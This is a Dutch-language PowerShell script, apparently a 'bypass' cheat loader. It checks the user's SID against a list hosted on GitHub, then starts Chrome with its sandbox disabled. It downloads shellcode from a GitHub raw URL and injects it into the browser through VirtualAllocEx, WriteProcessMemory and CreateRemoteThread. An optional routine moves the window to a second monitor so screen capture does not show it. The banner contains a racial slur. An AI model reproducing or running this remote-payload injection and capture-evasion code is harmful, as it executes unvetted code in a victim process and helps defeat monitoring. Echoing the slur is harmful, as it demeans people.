$githubRawUrl = "https://raw.githubusercontent.com/MJ06-BP/bp/refs/heads/main/SID.json"

try {
    
    $response = Invoke-WebRequest -Uri $githubRawUrl -UseBasicParsing -ErrorAction Stop
    $jsonContent = $response.Content | ConvertFrom-Json
    
    if ($jsonContent -is [array]) {
        $allowedSids = $jsonContent
    } elseif ($jsonContent.allowed_sids) {
        $allowedSids = $jsonContent.allowed_sids
    } else {
        $allowedSids = @($jsonContent)
    }

    $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent()
    $currentSid = $currentUser.User.Value

    if ($allowedSids -contains $currentSid) {
    } else {
        exit
    }
}
catch {
    pause
    exit
}

Clear-Host
Write-Host ""
Write-Host " ----------------------------------------" -ForegroundColor Cyan
Write-Host "" -ForegroundColor Cyan
Write-Host "           NIGGER BYPASS v6.7" -ForegroundColor Cyan
Write-Host "" -ForegroundColor Cyan
Write-Host " ----------------------------------------" -ForegroundColor Cyan
Write-Host ""
Write-Host ""
Write-Host ""
Write-Host "[1] Streamproof versie." -ForegroundColor Yellow
Write-Host "[2] Zonder Streamproof versie." -ForegroundColor Yellow
$choice1 = Read-Host "Maak je keuze (1 of 2)."

if ($choice1 -eq "1") {
    $url = "https://raw.githubusercontent.com/MJ06-BP/bp/main/browser.bin"
    $useNvidiaBypass = $false
    Write-Host "[+] Streamproof versie gekozen." -ForegroundColor Green
}
elseif ($choice1 -eq "2") {
    $url = "https://raw.githubusercontent.com/MJ06-BP/bp/main/shellcode.bin"
    Write-Host "[1] Ja, Nvidia clip gebruiken." -ForegroundColor Yellow
    Write-Host "[2] Nee, geen Nvidia clip." -ForegroundColor Yellow
    $nvidiaChoice = Read-Host "Wil je Nvidia Bypass? (1 of 2)"
    $useNvidiaBypass = ($nvidiaChoice -eq "1")
    if ($useNvidiaBypass) {
        Write-Host "[+] Nvidia Bypass ingeschakeld." -ForegroundColor Green
    } else {
        Write-Host "[+] Nvidia Bypass uitgeschakeld." -ForegroundColor Yellow
    }
}
else {
    Write-Host "[-] Ongeldige keuze!" -ForegroundColor Red
    pause; exit
}

$MonitorX = 0
$Width = 1920
$Height = 1080

if ($useNvidiaBypass) {
    Write-Host ""
    Write-Host "[1] Tweede monitor staat LINKS." -ForegroundColor Yellow
    Write-Host "[2] Tweede monitor staat RECHTS." -ForegroundColor Yellow
    $monChoice = Read-Host "Maak je keuze (1 of 2)."
    if ($monChoice -eq "1") { $MonitorX = -1920 }
    elseif ($monChoice -eq "2") { $MonitorX = 1920 }
    else { Write-Host "[-] Ongeldige keuze!" -ForegroundColor Red; pause; exit }
}

if (-not [Environment]::Is64BitProcess) {
    Write-Host "[-] Gebruik 64-bit PowerShell als Administrator!" -ForegroundColor Red
    pause; exit
}

function Invoke-NvidiaBypass {
    param([int]$TargetPID, [int]$MonitorX = -1920, [int]$Width = 1920, [int]$Height = 1080)
    Add-Type @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("user32.dll")] public static extern bool MoveWindow(IntPtr hWnd, int X, int Y, int nWidth, int nHeight, bool bRepaint);
    [DllImport("user32.dll")] public static extern bool SetForegroundWindow(IntPtr hWnd);
    [DllImport("user32.dll")] public static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);
}
"@ -ErrorAction SilentlyContinue

    $process = Get-Process -Id $TargetPID -ErrorAction SilentlyContinue
    if (-not $process) { Write-Host "[-] Proces niet gevonden" -ForegroundColor Red; return }
    
    $hwnd = $process.MainWindowHandle
    if ($hwnd -eq [IntPtr]::Zero) {
        $hwnd = [IntPtr]::Zero
        $callback = {
            param($hWnd, $lParam)
            $procId = 0
            [Win32]::GetWindowThreadProcessId($hWnd, [ref]$procId) | Out-Null
            if ($procId -eq $TargetPID) { $script:hwnd = $hWnd; return $false }
            return $true
        }
        $delegate = New-Object System.Func[IntPtr, IntPtr, bool] $callback
        [Win32]::EnumWindows($delegate, [IntPtr]::Zero) | Out-Null
    }

    if ($hwnd -eq [IntPtr]::Zero) {
        Write-Host "[-] Geen venster gevonden" -ForegroundColor Red
        return
    }

    [Win32]::SetForegroundWindow($hwnd) | Out-Null
    for ($i = 1; $i -le 6; $i++) {
        [Win32]::MoveWindow($hwnd, $MonitorX, 0, $Width, $Height, $true) | Out-Null
        Start-Sleep -Milliseconds 150
    }
}

# Rest van het script...
try {
    Start-Process "chrome.exe" -ArgumentList "--no-sandbox --start-maximized --disable-gpu"
    Start-Sleep 2
} catch {
    Write-Host "[-] Kon Chrome niet starten. Zorg dat Chrome geïnstalleerd is." -ForegroundColor Red
    pause; exit
}

Write-Host "[i] Zoek Chrome browser proces..." -ForegroundColor Yellow
$targetProcess = Get-WmiObject Win32_Process | Where-Object {
    $_.Name -eq "chrome.exe" -and $_.CommandLine -notlike "*--type=*" -and $_.CommandLine -notlike "*--service=*"
} | Sort-Object CreationDate | Select-Object -First 1

if (-not $targetProcess) {
    Write-Host "[-] Geen browser proces gevonden!" -ForegroundColor Red
    pause; exit
}

$targetPID = $targetProcess.ProcessId
Write-Host "[+] Chrome Browser PID: $targetPID" -ForegroundColor Green

if ($useNvidiaBypass) {
    Start-Sleep -Milliseconds 2000
    Invoke-NvidiaBypass -TargetPID $targetPID -MonitorX $MonitorX
}

try {
    $shellcode = (New-Object Net.WebClient).DownloadData($url)
} catch {
    Write-Host "[-] Download mislukt: $($_.Exception.Message)" -ForegroundColor Red
    pause; exit
}

$size = $shellcode.Length

Add-Type -MemberDefinition @"
    [DllImport("kernel32.dll")] public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
    [DllImport("kernel32.dll")] public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll")] public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);
    [DllImport("kernel32.dll")] public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
    [DllImport("kernel32.dll")] public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
    [DllImport("kernel32.dll")] public static extern bool CloseHandle(IntPtr hObject);
"@ -Name Win32 -Namespace Native -PassThru

try {
    $hProcess = [Native.Win32]::OpenProcess(0x001F0FFF, $false, $targetPID)
    if ($hProcess -eq [IntPtr]::Zero) {
        throw "OpenProcess mislukt. Script moet als Administrator draaien!"
    }

    $addr = [Native.Win32]::VirtualAllocEx($hProcess, [IntPtr]::Zero, [uint32]$size, 0x3000, 0x40)
    $bytesWritten = [UIntPtr]::Zero
    [Native.Win32]::WriteProcessMemory($hProcess, $addr, $shellcode, [uint32]$size, [ref]$bytesWritten) | Out-Null
    [Native.Win32]::VirtualProtectEx($hProcess, $addr, [uint32]$size, 0x40, [ref]$null) | Out-Null
    [Native.Win32]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [ref]$null) | Out-Null

    Write-Host "[+] Injectie succesvol!" -ForegroundColor Green
}
catch {
    Write-Host "[-] Injectie mislukt: $($_.Exception.Message)" -ForegroundColor Red
    pause; exit
}
finally {
    if ($hProcess -ne [IntPtr]::Zero) { [Native.Win32]::CloseHandle($hProcess) | Out-Null }
}

if ($useNvidiaBypass) {
    Start-Sleep -Milliseconds 2500
    Invoke-NvidiaBypass -TargetPID $targetPID -MonitorX $MonitorX
}

Clear-Host
Write-Host "[!] Laat Chrome open staan!" -ForegroundColor Red
Write-Host "[-] Om te cleanen: druk op END of sluit Chrome helemaal af." -ForegroundColor Yellow
Write-Host "#CLEAN" -ForegroundColor Cyan
